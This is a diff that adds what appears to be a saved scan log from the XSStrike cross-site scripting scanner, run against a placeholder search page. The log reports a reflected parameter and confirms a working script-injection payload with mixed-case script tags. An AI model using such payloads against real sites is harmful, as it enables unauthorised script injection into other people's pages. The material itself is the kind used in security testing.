@@ -1,0 +1,14 @@
+	XSStrike v3.1.5
+
+[~] Checking for DOM vulnerabilities
+[+] WAF Status: Offline
+[!] Testing parameter: q
+[!] Reflections found: 1
+[~] Analysing reflections
+[~] Generating payloads
+[!] Payloads generated: 3072
+[+] Payload: <ScRipT>confirm(1)</sCrIpT>
+[!] Efficiency: 100
+[!] Confidence: 10
+[+] Vulnerable webpage: https://t.example/search
+[+] Vector for q: <ScRipT>confirm(1)</sCrIpT>
